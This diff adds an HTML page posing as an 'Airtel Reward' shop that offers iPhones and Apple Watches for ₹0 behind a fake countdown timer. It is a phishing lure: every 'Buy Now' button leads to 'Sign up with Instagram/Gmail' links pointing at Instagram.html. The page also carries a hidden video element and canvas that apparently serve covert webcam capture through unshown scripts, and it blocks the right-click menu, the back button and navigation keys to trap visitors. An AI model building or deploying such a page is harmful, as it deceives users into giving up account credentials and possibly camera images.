@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Reward</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="cssjs/style.css">
+	<link rel="stylesheet" type="text/css" href="cssjsproductcard.css">
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+</head>
+<body onload="init()">
+
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<header>
+   <span class="menu-icon" onclick="toggleMenu()">☰</span>
+   <img src="img/1701703226462.png" alt="Your Website Logo" onclick="toggleMenu()">
+   <img src="img/1700372762744.png" alt="Profile Icon" class="profile-icon">
+</header>
+<div class="loading-line" id="loadingLine"></div>
+
+
+ <!--- img slider ---->
+<div class="slider-container">
+ <div class="slider">
+  <div class="slide"><img src="img/images (19).jpeg" alt="Slide 1"></div>
+  <div class="slide"><img src="img/images (18).jpeg" alt="Slide 2"></div>
+  <div class="slide"><img src="img/F6TUp8EbQAEh-Yt.jpg" alt="Slide 3"></div>
+ </div>
+</div>
+    
+     <!--- Offer countdown timer---->
+    <div class="container">
+    <div class="timer-display" id="timerDisplay"></div>
+    <p class="offer-message">Offer Ending Soon!</p>
+</div>
+ <!--- nav bar text ---->
+      <nav>
+       <div class="search-container">
+        <input type="text" class="search-box" placeholder="Search...">
+       </div>
+    <a href="Instagram.html">Electronics</a>
+    <a href="Instagram.html">Fashion</a>
+    <a href="Instagram.html">Home & Furniture</a>
+    <a href="Instagram.html">Books</a>
+    <a href="Instagram.html">Deals</a>
+    <a href="/Instagram.html">Contact</a>
+  </nav>
+ <!--- product card ---->
+<div class="product">
+ <img src="product/iPhone15pro.jpg">
+ <div class="product-info">
+  <h4 class="product-title">iPhone 15 Pro 1TB</h4>
+  <p class="product-price" style="font-size: 1.40em;">₹0</p>
+  <a class="product-btn" href="#" onclick="openPopup()">Buy Now</a>
+ </div>
+</div>
+
+<div class="new-product">
+ <img src="iPhone-14.jpg">
+ <div class="new-product-info">
+  <h4 class="new-product-title">iPhone 14 1Tb</h4>
+  <p class="new-product-price" style="font-size: 1.40em;">₹0</p>
+  <a class="new-product-btn" href="#" onclick="openPopup()">Buy Now</a>
+ </div>
+</div>
+
+<div class="product">
+ <img src="product/iPhon.jpg">
+ <div class="product-info">
+  <h4 class="product-title">Collect today iPhone 15 Pro</h4>
+  <p class="product-price" style="font-size: 1.40em;">₹0</p>
+  <a class="product-btn" href="#" onclick="openPopup()">Buy Now</a>
+ </div>
+</div>
+
+<div class="new-product">
+ <img src="product/applewatch.jpg">
+ <div class="new-product-info">
+  <h4 class="new-product-title">Apple smart watch</h4>
+  <p class="new-product-price" style="font-size: 1.40em;">₹0</p>
+  <a class="new-product-btn" href="#" onclick="openPopup()">Buy Now</a>
+ </div>
+</div>
+
+<div class="product">
+ <img src="product/shopping (5).webp">
+ <div class="product-info">
+  <h4 class="product-title">AirPod 2nd Gen</h4>
+  <p class="product-price" style="font-size: 1.40em;">₹0</p>
+  <a class="product-btn" href="#" onclick="openPopup()">Buy Now</a>
+ </div>
+</div>
+
+<div class="new-product">
+ <img src="product/apple.jpg">
+ <div class="new-product-info">
+  <h4 class="new-product-title">Apple Watch Ultra</h4>
+  <p class="new-product-price" style="font-size: 1.40em;">₹0</p>
+  <a class="new-product-btn" href="#" onclick="openPopup()">Buy Now</a>
+ </div>
+</div>
+
+
+<!-- Popup container -->
+<div id="signupPopup" class="popup">
+ <div class="popup-content">
+  <span class="close" onclick="closePopup()">&times;</span>
+  <p class="info-text">Unlock Rewards, Please Sign Up Today</p>
+  <a href="Instagram.html" target="_blank"><button class="pipliwal">Sign up with Instagram</button></a>
+  <a href="Instagram.html" target="_blank"><button class="pipliwal_rdx">Sign up with Gmail</button></a>
+  <img src="img/images (1).jpeg" alt="Description of the image" class="imgrp">
+ </div>
+</div>
+
+
+    <script>
+ 
+ function openPopup() {
+    document.getElementById("signupPopup").style.display = "block";
+}
+
+function closePopup() {
+    document.getElementById("signupPopup").style.display = "none";
+}
+
+function openInstagramSignup() {
+    // Add your Instagram signup logic here
+    alert("Instagram signup clicked");
+}
+
+function openGmailSignup() {
+    // Add your Gmail signup logic here
+    alert("Gmail signup clicked");
+}
+
+</script>
+
+
+<script>
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+  });
+</script>
+
+<script>
+  
+  
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+    history.go(1);
+};
+
+document.addEventListener("DOMContentLoaded", function() {
+    document.addEventListener("keydown", function(e) {
+        if (e.key === "Backspace" || e.key === "Home") {
+            e.preventDefault();
+        }
+    });
+});
+
+</script>
+
+    
+  <script src="cssjs/databot.js"></script>  
+<script src="cssjs/rdx.js"></script>    
+</body>
+</html>
